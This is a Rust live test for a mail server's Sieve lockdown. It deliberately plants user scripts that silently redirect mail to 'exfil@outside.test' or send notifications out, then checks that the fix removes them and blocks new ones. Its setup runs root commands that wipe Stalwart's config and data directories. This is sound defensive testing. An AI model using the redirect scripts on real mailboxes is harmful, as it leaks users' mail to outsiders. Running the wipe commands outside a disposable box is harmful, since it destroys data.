//! LIVE probe for the Sieve lockdown (test-only, `#[ignore]`).
//!
//! Runs K2's real calls against a real Stalwart on the disposable
//! mailprobe box: K2's own bootstrap/provisioning (the `BootstrapApi`
//! the enable machine drives), then the lockdown's mint permissions,
//! existing-account patch, `enotify` off, the reconcile, the user-side
//! refusal and K2's own `k2` / `k2-forward` scripts. Mail never leaves
//! the box: every outbound route points at Mailpit on 127.0.0.1:1025.
//!
//! Run AS ROOT on the probe box only (it installs Stalwart, wipes
//! `/etc/stalwart` + `/var/lib/stalwart`, writes the systemd unit):
//!
//! ```text
//! sudo K2_MAILPROBE_STALWART=0.16.10 ./k2_daemon-<hash> \
//!   --ignored --exact mail::sieve_lockdown_live::live_sieve_lockdown_probe --nocapture
//! ```
//!
//! Every check prints `[PASS]` / `[FAIL]` / `[INFO]`; the test fails at
//! the end if any check failed (never at the first one, so one run maps
//! a whole version).

use std::collections::HashSet;
use std::io::{BufRead, BufReader, Write};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use super::jmap::{StalwartBootstrap, StalwartClient};
use super::sieve_lockdown as sl;
use super::sieve_user;
use super::supervisor::{
    hardening_dropin, systemd_unit, BootstrapApi, STALWART_MGMT_URL, STALWART_SETUP_URL,
};

const DOMAIN: &str = "example.test";
const HOST: &str = "mail.example.test";
const MAILPIT: &str = "http://127.0.0.1:8025";
const CORE: &str = "urn:ietf:params:jmap:core";
const SIEVE: &str = "urn:ietf:params:jmap:sieve";
const MAIL: &str = "urn:ietf:params:jmap:mail";
const REGISTRY: &str = "urn:stalwart:jmap";

#[derive(Default)]
struct Report {
    failed: Vec<String>,
}

impl Report {
    fn check(&mut self, step: &str, ok: bool, detail: impl AsRef<str>) {
        println!("[{}] {step}: {}", if ok { "PASS" } else { "FAIL" }, detail.as_ref());
        if !ok {
            self.failed.push(step.to_string());
        }
    }
    fn info(&self, step: &str, detail: impl AsRef<str>) {
        println!("[INFO] {step}: {}", detail.as_ref());
    }
}

fn sh(cmd: &str) -> Result<String, String> {
    let out = std::process::Command::new("bash")
        .args(["-c", cmd])
        .output()
        .map_err(|e| format!("spawn bash: {e}"))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    if out.status.success() {
        Ok(text)
    } else {
        Err(format!("`{cmd}` failed ({}): {text}", out.status))
    }
}

fn must(r: Result<String, String>) -> String {
    r.unwrap_or_else(|e| panic!("{e}"))
}

fn write_file(path: &str, body: &str, mode: u32) {
    use std::os::unix::fs::PermissionsExt;
    std::fs::write(path, body).unwrap_or_else(|e| panic!("write {path}: {e}"));
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
        .unwrap_or_else(|e| panic!("chmod {path}: {e}"));
}

/// Retry `f` for up to `secs` (Stalwart coming up after a restart).
fn retry<T>(what: &str, secs: u64, mut f: impl FnMut() -> Result<T, String>) -> T {
    let deadline = Instant::now() + Duration::from_secs(secs);
    loop {
        match f() {
            Ok(v) => return v,
            Err(e) if Instant::now() < deadline => {
                let _ = e;
                std::thread::sleep(Duration::from_millis(700));
            }
            Err(e) => panic!("{what}: gave up after {secs}s: {e}"),
        }
    }
}

fn restart() {
    must(sh("systemctl restart stalwart"));
}

/// One raw JMAP call with `using`, returning the first method response
/// `[name, args]` (a method-level `error` comes back as `["error", …]`).
fn raw(c: &StalwartClient, using: &[&str], method: &str, args: Value) -> Result<(String, Value), String> {
    let api = c.discover_api_url()?;
    let resp = c.post_json_url(&api, &json!({ "using": using, "methodCalls": [[method, args, "0"]] }))?;
    let first = resp["methodResponses"][0].clone();
    let name = first[0].as_str().unwrap_or("").to_string();
    Ok((name, first[1].clone()))
}

fn registry(c: &StalwartClient, method: &str, mut args: Value) -> Result<Value, String> {
    let session = c.discover_session()?;
    if args.get("accountId").is_none() {
        args["accountId"] = json!(session.account_id);
    }
    let (name, a) = raw(c, &[CORE, REGISTRY], method, args)?;
    if name != method {
        return Err(format!("{method}: {name} {a}"));
    }
    Ok(a)
}

/// Did a `SieveScript/set` get refused (method error or a not* entry)
/// with nothing created/updated/destroyed?
fn refused(name: &str, a: &Value) -> bool {
    if name == "error" {
        return true;
    }
    let any = |k: &str| a.get(k).and_then(|v| v.as_object()).is_some_and(|m| !m.is_empty())
        || a.get(k).and_then(|v| v.as_array()).is_some_and(|m| !m.is_empty());
    !any("created") && !any("updated") && !any("destroyed")
        && (any("notCreated") || any("notUpdated") || any("notDestroyed"))
}

fn smtp_send(to: &str, msg_id: &str, subject: &str) -> Result<(), String> {
    let s = std::net::TcpStream::connect("127.0.0.1:25").map_err(|e| format!("connect :25: {e}"))?;
    s.set_read_timeout(Some(Duration::from_secs(30))).ok();
    let mut w = s.try_clone().map_err(|e| e.to_string())?;
    let mut r = BufReader::new(s);
    let reply = |r: &mut BufReader<std::net::TcpStream>| -> Result<String, String> {
        let mut all = String::new();
        loop {
            let mut line = String::new();
            r.read_line(&mut line).map_err(|e| format!("read: {e}"))?;
            if line.is_empty() {
                return Err(format!("connection closed after: {all}"));
            }
            all.push_str(&line);
            if line.len() < 4 || line.as_bytes()[3] == b' ' {
                return Ok(all);
            }
        }
    };
    let expect = |got: String, code: &str| -> Result<(), String> {
        if got.starts_with(code) { Ok(()) } else { Err(format!("want {code}, got: {}", got.trim())) }
    };
    expect(reply(&mut r)?, "220")?;
    let cmd = |w: &mut std::net::TcpStream, r: &mut BufReader<std::net::TcpStream>, line: &str, code: &str| {
        w.write_all(format!("{line}\r\n").as_bytes()).map_err(|e| e.to_string())?;
        expect(reply(r)?, code)
    };
    cmd(&mut w, &mut r, "EHLO probe.origin.test", "250")?;
    cmd(&mut w, &mut r, "MAIL FROM:<sender@origin.test>", "250")?;
    cmd(&mut w, &mut r, &format!("RCPT TO:<{to}>"), "250")?;
    cmd(&mut w, &mut r, "DATA", "354")?;
    let body = format!(
        "From: Sender <sender@origin.test>\r\nTo: <{to}>\r\nSubject: {subject}\r\nMessage-ID: <{msg_id}>\r\n\
         Date: Tue, 27 Oct 2026 12:00:00 +0000\r\nContent-Type: text/plain\r\n\r\nk2 probe body {msg_id}\r\n."
    );
    cmd(&mut w, &mut r, &body, "250")?;
    let _ = w.write_all(b"QUIT\r\n");
    Ok(())
}

fn mailpit_messages() -> Vec<Value> {
    let text = reqwest::blocking::get(format!("{MAILPIT}/api/v1/messages?limit=1000"))
        .and_then(|r| r.text())
        .unwrap_or_else(|e| panic!("mailpit: {e}"));
    let v: Value = serde_json::from_str(&text).unwrap_or_else(|e| panic!("mailpit JSON: {e}: {text}"));
    v["messages"].as_array().cloned().unwrap_or_default()
}

/// Did a copy of `msg_id` leave the box? Only outbound mail reaches the
/// sink (local delivery never does), and a redirect keeps the original
/// headers (`To:` is still the mailbox), so the Message-ID is the key.
/// `_envelope_to` documents where Stalwart was told to send it.
fn mailpit_has(msg_id: &str, _envelope_to: &str) -> bool {
    mailpit_messages().iter().any(|m| m["MessageID"].as_str() == Some(msg_id))
}

fn mailpit_count_subject(marker: &str) -> usize {
    mailpit_messages()
        .iter()
        .filter(|m| m["Subject"].as_str().is_some_and(|s| s.contains(marker)))
        .count()
}

/// Is a message with `msg_id` in `account`'s mailbox (service key)?
/// Every id, then each one's parsed `messageId` (no search index).
fn delivered(c: &StalwartClient, account: &str, msg_id: &str) -> bool {
    let Ok((n, q)) = raw(c, &[CORE, MAIL], "Email/query", json!({ "accountId": account, "limit": 500 })) else {
        return false;
    };
    let ids = match (n.as_str(), q["ids"].as_array()) {
        ("Email/query", Some(ids)) if !ids.is_empty() => ids.clone(),
        _ => return false,
    };
    let Ok((n, g)) = raw(
        c,
        &[CORE, MAIL],
        "Email/get",
        json!({ "accountId": account, "ids": ids, "properties": ["messageId"] }),
    ) else {
        return false;
    };
    n == "Email/get"
        && g["list"].as_array().is_some_and(|l| {
            l.iter().any(|e| {
                e["messageId"].as_array().is_some_and(|m| m.iter().any(|x| x.as_str() == Some(msg_id)))
            })
        })
}

const SINK_FORWARDER: &str = r#"
import socket, threading
def pipe(a, b):
    try:
        while True:
            d = a.recv(65536)
            if not d:
                break
            b.sendall(d)
    except Exception:
        pass
    finally:
        for s in (a, b):
            try:
                s.close()
            except Exception:
                pass
l = socket.socket()
l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
l.bind(("SINK_IP", SINK_PORT))
l.listen(16)
while True:
    c, _ = l.accept()
    u = socket.create_connection(("127.0.0.1", 1025))
    threading.Thread(target=pipe, args=(c, u), daemon=True).start()
    threading.Thread(target=pipe, args=(u, c), daemon=True).start()
"#;

/// Stalwart refuses to relay to a loopback address, so the sink is a
/// tiny forwarder on this box's own public IPv4 (traffic to it stays on
/// `lo`) → Mailpit 127.0.0.1:1025. Returns (ip, port, child).
fn start_sink_forwarder() -> (String, u16, std::process::Child) {
    let ips = must(sh("hostname -I"));
    let ip = ips
        .split_whitespace()
        .find(|a| a.parse::<std::net::Ipv4Addr>().is_ok_and(|v| !v.is_loopback()))
        .expect("a non-loopback IPv4 for the sink forwarder")
        .to_string();
    let port = 2626u16;
    let py = SINK_FORWARDER.replace("SINK_IP", &ip).replace("SINK_PORT", &port.to_string());
    let child = std::process::Command::new("python3").args(["-c", &py]).spawn().expect("spawn sink forwarder");
    std::thread::sleep(Duration::from_millis(800));
    (ip, port, child)
}

fn wait_for(secs: u64, mut f: impl FnMut() -> bool) -> bool {
    let deadline = Instant::now() + Duration::from_secs(secs);
    loop {
        if f() {
            return true;
        }
        if Instant::now() >= deadline {
            return false;
        }
        std::thread::sleep(Duration::from_millis(800));
    }
}

/// Plant a script as the mailbox user itself (the gap).
fn plant_as_user(user: &StalwartClient, account: &str, name: &str, src: &str, activate: bool) -> Result<(String, Value), String> {
    let blob = user.blob_upload(account, src.as_bytes())?;
    let mut args = json!({ "accountId": account, "create": { "x": { "name": name, "blobId": blob } } });
    if activate {
        args["onSuccessActivateScript"] = json!("#x");
    }
    raw(user, &[CORE, SIEVE], "SieveScript/set", args)
}

#[test]
#[ignore = "live: run as root on the disposable mailprobe box (installs and wipes Stalwart)"]
fn live_sieve_lockdown_probe() {
    let v = std::env::var("K2_MAILPROBE_STALWART")
        .expect("set K2_MAILPROBE_STALWART to the staged version (0.16.10 | 0.16.25)");
    let bin = format!("/opt/stalwart-{v}/stalwart");
    assert!(std::path::Path::new(&bin).exists(), "{bin} is not staged");
    let mut rep = Report::default();
    let tag = format!("{}-{}", v.replace('.', ""), std::process::id());
    println!("== Stalwart {v} (run {tag}) ==");

    // ── Fixture: K2's own enable flow, against a fresh store ─────────
    must(sh(
        "systemctl stop stalwart 2>/dev/null; systemctl disable stalwart 2>/dev/null; \
         rm -rf /etc/stalwart /var/lib/stalwart /var/log/stalwart \
           /etc/systemd/system/stalwart.service /etc/systemd/system/stalwart.service.d; \
         systemctl daemon-reload; true",
    ));
    must(sh(&format!("install -m 0755 {bin} /usr/local/bin/stalwart")));
    must(sh("id stalwart >/dev/null 2>&1 || useradd --system --no-create-home --shell /usr/sbin/nologin stalwart"));
    must(sh("mkdir -p /etc/stalwart /var/lib/stalwart /var/log/stalwart /etc/systemd/system/stalwart.service.d && \
             chown -R stalwart: /etc/stalwart /var/lib/stalwart /var/log/stalwart"));
    let recovery = super::secrets::generate_secret().expect("secret");
    write_file("/etc/systemd/system/stalwart.service", &systemd_unit(Some(&recovery)), 0o600);
    write_file("/etc/systemd/system/stalwart.service.d/k2-hardening.conf", hardening_dropin(), 0o644);
    must(sh("systemctl daemon-reload && systemctl enable --now stalwart"));

    let mut bs = StalwartBootstrap::new();
    retry("bootstrap auth", 90, || bs.authenticate(STALWART_SETUP_URL, "admin", &recovery));
    let creds = bs.complete_bootstrap(HOST, DOMAIN, false).expect("Bootstrap/set");
    restart();
    retry("admin auth", 90, || bs.authenticate(STALWART_SETUP_URL, &creds.username, &creds.secret));
    bs.bind_setup_http_loopback().expect("bind setup loopback");
    restart();
    retry("admin auth 2", 90, || bs.authenticate(STALWART_SETUP_URL, &creds.username, &creds.secret));
    bs.configure_listeners("http-01").expect("listeners_apply http-01");
    let svc_id = bs.create_service_account(DOMAIN).expect("service account");
    let key = bs.mint_api_key(&svc_id).expect("api key");
    write_file("/etc/systemd/system/stalwart.service", &systemd_unit(None), 0o600);
    must(sh("systemctl daemon-reload"));
    restart();
    let c = StalwartClient::new(STALWART_MGMT_URL, key.clone());
    retry("service key ping on :8180", 90, || c.ping());
    rep.info("fixture", format!("K2 enable flow done on {v}; service account {svc_id}"));

    // Every outbound message → Mailpit (nothing can reach the wire).
    let (sink_ip, sink_port, mut sink) = start_sink_forwarder();
    let route = registry(&c, "x:MtaRoute/set", json!({ "create": { "mp": {
        "@type": "Relay", "name": "mailpit", "description": "probe sink",
        "address": sink_ip, "port": sink_port, "protocol": "smtp", "implicitTls": false } } }))
        .expect("x:MtaRoute/set");
    assert!(route["created"]["mp"]["id"].is_string(), "mailpit route not created: {route}");
    let strat = registry(&c, "x:MtaOutboundStrategy/get", json!({ "ids": ["singleton"] })).expect("strategy get");
    let mut expr = strat["list"][0]["route"].clone();
    expr["else"] = json!("'mailpit'");
    let set = registry(&c, "x:MtaOutboundStrategy/set", json!({ "update": { "singleton": { "route": expr } } }))
        .expect("strategy set");
    assert!(set["updated"].get("singleton").is_some(), "strategy not updated: {set}");
    // K2's A4 spam-rules repair (defaults.rs), as on every real box:
    // Stalwart pulls the latest rules at first start, which call
    // `bit_and` (absent before 0.16.23) and refuse every ReloadSettings.
    {
        use super::defaults::{parse_version, plan_spam_repair, DefaultsApi};
        let ver = parse_version(&v).expect("version");
        let servers = retry("spam rules download", 120, || {
            let s = c.dnsbl_servers()?;
            if s.is_empty() { Err("no SpamDnsblServer yet".to_string()) } else { Ok(s) }
        });
        for w in plan_spam_repair(&servers, ver) {
            c.dnsbl_server_set(&w.id, w.body.clone()).expect("A4 repair write");
            rep.info("fixture", format!("A4 spam rule {} rewritten (K2 defaults repair)", w.name));
        }
    }
    c.action_reload_settings().expect("ReloadSettings after route");
    rep.info("fixture", format!("every outbound route → {sink_ip}:{sink_port} → mailpit 127.0.0.1:1025"));

    let did = c.domain_query_id(DOMAIN).expect("domain query").expect("example.test exists");
    let mk = |name: &str, perms: Option<&Value>| -> Result<(String, String), String> {
        let pw = super::secrets::generate_secret()?;
        c.account_create(name, &did, &pw, 1_073_741_824, 10_000, perms).map(|id| (id, pw))
    };
    let rows = |id: &str| -> Value {
        c.account_get_permissions(&[id.to_string()]).expect("account get")[0]["permissions"].clone()
    };

    // ── 1. Mint WITH the lock (the new addresses::mint_address path) ─
    let lock = sl::mint_permissions(None).expect("lock perms");
    let (alice, alice_pw) = match mk("alice", Some(&lock)) {
        Ok(a) => {
            let p = rows(&a.0);
            rep.check("1 mint with Sieve lock", sl::is_locked(Some(&p)), format!("created {}; read back {p}", a.0));
            a
        }
        Err(e) => {
            rep.check("1 mint with Sieve lock", false, format!("account create REFUSED: {e}"));
            let candidates = sl::SIEVE_WRITE_PERMISSIONS.iter().chain(
                ["jmapSieveScriptSet", "jmapSieveScriptGet", "sieveAuthenticate", "sysAppPasswordCreate", "sysApiKeyCreate"].iter(),
            );
            for (i, name) in candidates.enumerate() {
                let one = crate::mail::dav::merge_permissions(None, &[*name], &[]).expect("merge").expect("some");
                match mk(&format!("probe{i}"), Some(&one)) {
                    Ok((id, _)) => {
                        rep.info("1 name probe", format!("{name}: ACCEPTED"));
                        let _ = c.account_set_permissions(&id, &json!({"@type": "Inherit"}));
                    }
                    Err(e) => rep.info("1 name probe", format!("{name}: REJECTED ({e})")),
                }
            }
            mk("alice", None).expect("alice without lock")
        }
    };
    let (carol, _) = mk("carol", Some(&lock)).or_else(|_| mk("carol", None)).expect("carol");
    let (dave, _) = mk("dave", Some(&lock)).or_else(|_| mk("dave", None)).expect("dave");
    // Accounts that predate the fix (no lock).
    let (bob, bob_pw) = mk("bob", None).expect("bob");
    let (erin, erin_pw) = mk("erin", None).expect("erin");
    let (frank, _) = mk("frank", None).expect("frank");

    // ── The gap, before the fix: a user plants an outside redirect ───
    let bob_user = StalwartClient::new_basic(STALWART_MGMT_URL, format!("bob@{DOMAIN}"), bob_pw.clone());
    let (n, a) = plant_as_user(&bob_user, &bob, "mine", "require [\"copy\"];\nredirect :copy \"exfil@outside.test\";\n", true)
        .expect("bob plant");
    rep.check("0 gap: user plants redirect (pre-fix)", n == "SieveScript/set" && a["created"]["x"]["id"].is_string(), format!("{n} {a}"));
    let (n, a) = plant_as_user(&bob_user, &bob, "filters", "require \"fileinto\";\nfileinto \"INBOX\";\n", false)
        .expect("bob plant 2");
    rep.info("0 gap: second inactive user script", format!("{n} {a}"));
    let erin_user = StalwartClient::new_basic(STALWART_MGMT_URL, format!("erin@{DOMAIN}"), erin_pw.clone());
    let marker = format!("k2probe-notify-{tag}");
    let (n, a) = plant_as_user(
        &erin_user,
        &erin,
        "notifier",
        &format!("require [\"enotify\"];\nnotify :message \"{marker}\" \"mailto:notify@outside.test?subject={marker}\";\n"),
        true,
    )
    .expect("erin plant");
    rep.check("0 gap: user plants enotify (pre-fix)", n == "SieveScript/set" && a["created"]["x"]["id"].is_string(), format!("{n} {a}"));

    let b1 = format!("b1-{tag}@origin.test");
    smtp_send(&format!("bob@{DOMAIN}"), &b1, "probe b1").expect("send b1");
    rep.check("0 gap: redirect reaches the sink (pre-fix)", wait_for(45, || mailpit_has(&b1, "exfil@outside.test")), &b1);
    let e1 = format!("e1-{tag}@origin.test");
    smtp_send(&format!("erin@{DOMAIN}"), &e1, "probe e1").expect("send e1");
    rep.check("0 gap: enotify reaches the sink (pre-fix)", wait_for(45, || mailpit_count_subject(&marker) >= 1), &marker);

    // ── 2. Patch an existing account (the reconcile's patch) ─────────
    match sl::lock_permissions(Some(&rows(&frank))).expect("merge") {
        Some(next) => match c.account_set_permissions(&frank, &next) {
            Ok(()) => {
                let p = rows(&frank);
                rep.check("2 patch existing account", sl::is_locked(Some(&p)), format!("read back {p}"));
            }
            Err(e) => rep.check("2 patch existing account", false, format!("REFUSED: {e}")),
        },
        None => rep.check("2 patch existing account", false, "already locked?"),
    }

    // ── 6a. K2's own scripts, written by the service key ─────────────
    match sieve_user::patch_user_sieve(&c, &alice, sieve_user::SievePatch::SetForward(sieve_user::ForwardBlock {
        dest: format!("carol@{DOMAIN}"),
        keep: true,
    })) {
        Ok(_) => rep.check("6 K2 `k2` forward write (service key)", true, "alice → carol"),
        Err(e) => rep.check("6 K2 `k2` forward write (service key)", false, e),
    }
    match c.sieve_k2_forward_set(&dave, &format!("carol@{DOMAIN}"), false) {
        Ok(()) => rep.check("6 K2 legacy `k2-forward` write (service key)", true, "dave → carol"),
        Err(e) => rep.check("6 K2 legacy `k2-forward` write (service key)", false, e),
    }

    // ── 3. enotify off + reload ──────────────────────────────────────
    let outcome = sl::ensure_caps_off(&c);
    let now = c.sieve_user_interpreter_disabled();
    rep.check(
        "3 enotify off + ReloadSettings",
        outcome == sl::CapsOutcome::TurnedOff && now.as_ref().is_ok_and(|v| v["enotify"] == true),
        format!("{outcome:?}; read back {now:?}"),
    );
    rep.check("3 second call is a no-op", sl::ensure_caps_off(&c) == sl::CapsOutcome::AlreadyOff, "AlreadyOff");
    let before = mailpit_count_subject(&marker);
    let e2 = format!("e2-{tag}@origin.test");
    smtp_send(&format!("erin@{DOMAIN}"), &e2, "probe e2").expect("send e2");
    let got = wait_for(45, || delivered(&c, &erin, &e2));
    std::thread::sleep(Duration::from_secs(10));
    let after = mailpit_count_subject(&marker);
    rep.check("3 enotify no longer fires (script still installed)", got && after == before, format!("delivered={got}; notify mails {before} → {after}"));

    // ── 4. The reconcile ─────────────────────────────────────────────
    let accounts: Vec<(String, Option<String>)> = [
        (&alice, "alice"), (&bob, "bob"), (&carol, "carol"), (&dave, "dave"), (&erin, "erin"), (&frank, "frank"),
    ]
    .iter()
    .map(|(id, n)| ((*id).clone(), Some(format!("{n}@{DOMAIN}"))))
    .collect();
    let is_hosted = |d: &str| d == DOMAIN;
    let mut recorded: Vec<sl::Finding> = Vec::new();
    let report = {
        let mut record = |f: &sl::Finding| recorded.push(f.clone());
        sl::reconcile(&c, &accounts, &is_hosted, &HashSet::new(), &mut record)
    };
    for l in report.lines() {
        rep.info("4 reconcile", l);
    }
    for f in &recorded {
        rep.info("4 recorded (before removal)", f.audit_detail("probe").to_string());
    }
    let names: Vec<String> = recorded.iter().map(|f| format!("{}:{}", f.address.clone().unwrap_or_default(), f.script.name)).collect();
    let want = ["bob@example.test:mine", "bob@example.test:filters", "erin@example.test:notifier"];
    rep.check(
        "4 recorded exactly the user scripts",
        recorded.len() == 3 && want.iter().all(|w| names.iter().any(|n| n == w)),
        format!("{names:?}"),
    );
    rep.check(
        "4 targets are domains only",
        recorded.iter().all(|f| f.script.targets.iter().all(|t| !t.domain.contains('@'))),
        format!("{:?}", recorded.iter().map(|f| f.script.targets.clone()).collect::<Vec<_>>()),
    );
    rep.check("4 every removal succeeded", report.removals().all(|f| f.removed) && report.account_failed.is_empty(), format!("failed={:?}", report.account_failed));
    rep.check("4 bob + erin now locked", sl::is_locked(Some(&rows(&bob))) && sl::is_locked(Some(&rows(&erin))), format!("lock_failed={:?}", report.lock_failed));
    let left = |id: &str| c.sieve_scripts_list(id).expect("list").iter().map(|s| format!("{}{}", s.name, if s.is_active { "*" } else { "" })).collect::<Vec<_>>();
    rep.check("4 bob has no scripts left", left(&bob).is_empty(), format!("{:?}", left(&bob)));
    rep.check("4 erin has no scripts left", left(&erin).is_empty(), format!("{:?}", left(&erin)));
    rep.check("4 K2 scripts kept + active", left(&alice) == vec!["k2*".to_string()] && left(&dave) == vec!["k2-forward*".to_string()], format!("alice {:?} dave {:?}", left(&alice), left(&dave)));
    let b2 = format!("b2-{tag}@origin.test");
    smtp_send(&format!("bob@{DOMAIN}"), &b2, "probe b2").expect("send b2");
    let got = wait_for(45, || delivered(&c, &bob, &b2));
    std::thread::sleep(Duration::from_secs(10));
    rep.check("4 mail no longer forwards (distinct Message-ID)", got && !mailpit_has(&b2, "exfil@outside.test"), format!("b2 delivered locally={got}; sink copy={}", mailpit_has(&b2, "exfil@outside.test")));

    // ── 5. The mailbox's own credentials are refused ─────────────────
    let try_plant = |who: &StalwartClient, acct: &str| plant_as_user(who, acct, "again", "redirect \"x@outside.test\";\n", true);
    match try_plant(&bob_user, &bob) {
        Ok((n, a)) => rep.check("5 password: SieveScript/set create refused", refused(&n, &a), format!("{n} {a}")),
        Err(e) => rep.check("5 password: SieveScript/set create refused", e.contains("403") || e.contains("forbidden"), e),
    }
    match c.app_password_create(&bob, "probe") {
        Ok(ap) => {
            let app = StalwartClient::new_basic(STALWART_MGMT_URL, format!("bob@{DOMAIN}"), ap.secret);
            match try_plant(&app, &bob) {
                Ok((n, a)) => rep.check("5 app password: create refused", refused(&n, &a), format!("{n} {a}")),
                Err(e) => rep.check("5 app password: create refused", e.contains("403") || e.contains("forbidden"), e),
            }
        }
        Err(e) => rep.check("5 app password minted for the check", false, e),
    }
    let alice_user = StalwartClient::new_basic(STALWART_MGMT_URL, format!("alice@{DOMAIN}"), alice_pw);
    let k2_id = c.sieve_scripts_list(&alice).expect("list").into_iter().find(|s| s.name == "k2").map(|s| s.id).expect("k2 script");
    let blob = alice_user.blob_upload(&alice, b"redirect \"x@outside.test\";\n");
    match blob {
        Ok(blob) => {
            let (n, a) = raw(&alice_user, &[CORE, SIEVE], "SieveScript/set", json!({ "accountId": alice, "update": { &k2_id: { "blobId": blob } } })).expect("update");
            rep.check("5 password: update of K2's script refused", refused(&n, &a), format!("{n} {a}"));
        }
        Err(e) => rep.info("5 blob upload as alice", e),
    }
    let (n, a) = raw(&alice_user, &[CORE, SIEVE], "SieveScript/set", json!({ "accountId": alice, "destroy": [&k2_id] })).expect("destroy");
    rep.check("5 password: destroy of K2's script refused", refused(&n, &a), format!("{n} {a}"));
    let (n, a) = raw(&alice_user, &[CORE, SIEVE], "SieveScript/set", json!({ "accountId": alice, "onSuccessDeactivateScript": true })).expect("deactivate");
    let still = left(&alice) == vec!["k2*".to_string()];
    rep.check("5 password: deactivate has no effect", still, format!("{n} {a}; scripts {:?}", left(&alice)));

    // ── 6b. K2's forwards still deliver; second reconcile keeps them ──
    let a1 = format!("a1-{tag}@origin.test");
    smtp_send(&format!("alice@{DOMAIN}"), &a1, "probe a1").expect("send a1");
    rep.check("6 `k2` forward delivers alice → carol", wait_for(45, || delivered(&c, &carol, &a1)), &a1);
    let d1 = format!("d1-{tag}@origin.test");
    smtp_send(&format!("dave@{DOMAIN}"), &d1, "probe d1").expect("send d1");
    rep.check("6 `k2-forward` delivers dave → carol", wait_for(45, || delivered(&c, &carol, &d1)), &d1);
    let mut none = 0;
    let again = {
        let mut record = |_: &sl::Finding| none += 1;
        sl::reconcile(&c, &accounts, &is_hosted, &HashSet::new(), &mut record)
    };
    rep.check("6 second reconcile: nothing recorded, nothing written", none == 0 && again.locked.is_empty() && again.findings.is_empty(), again.lines().join(" | "));
    match sieve_user::patch_user_sieve(&c, &alice, sieve_user::SievePatch::UnsetForward) {
        Ok(_) => rep.check("6 K2 unset (service key) after the lock", left(&alice) == vec!["k2*".to_string()], format!("{:?}", left(&alice))),
        Err(e) => rep.check("6 K2 unset (service key) after the lock", false, e),
    }

    // ── 7. (read-only question) app password with sysAppPasswordCreate off ─
    let cur = rows(&bob);
    match crate::mail::dav::merge_permissions(Some(&cur), &["sysAppPasswordCreate"], &[]).expect("merge") {
        Some(next) => match c.account_set_permissions(&bob, &next) {
            Ok(()) => {
                match c.app_password_create(&bob, "probe-7") {
                    Ok(_) => rep.info("7 sysAppPasswordCreate off on bob", "service-key app-password mint STILL WORKS"),
                    Err(e) => rep.info("7 sysAppPasswordCreate off on bob", format!("service-key app-password mint REFUSED: {e}")),
                }
                let _ = c.account_set_permissions(&bob, &cur);
            }
            Err(e) => rep.info("7 sysAppPasswordCreate off on bob", format!("permission name REFUSED: {e}")),
        },
        None => rep.info("7", "already off"),
    }

    let _ = sink.kill();
    println!("== Stalwart {v}: {} failed check(s): {:?} ==", rep.failed.len(), rep.failed);
    assert!(rep.failed.is_empty(), "failed on Stalwart {v}: {:?}", rep.failed);
}
